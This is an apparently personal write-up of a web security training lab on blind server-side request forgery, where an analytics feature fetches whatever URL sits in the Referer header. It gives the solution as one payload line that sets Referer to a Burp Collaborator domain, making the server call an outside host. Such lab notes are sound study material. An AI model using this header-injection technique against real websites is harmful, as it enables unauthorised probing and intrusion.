# Lab: Blind SSRF with out-of-band detection

>This site uses analytics software which fetches the URL specified in the Referer header when a product page is loaded.

>To solve the lab, use this functionality to cause an HTTP request to the public Burp Collaborator server.

### Observations
**Vulnerable Area**: Referer header of `/product?productId=1`

**My Burp Client**: `7t1l5byzzgi2b4ttqgp2qh77vy1opd.burpcollaborator.net`

### Solution
This lab was VERY simple. Send the `GET /product?productId=1` request to repeater, then change the value of the `Referer` header to your burp collaborator url:

`Referer: https://7t1l5byzzgi2b4ttqgp2qh77vy1opd.burpcollaborator.net`

Lab solved!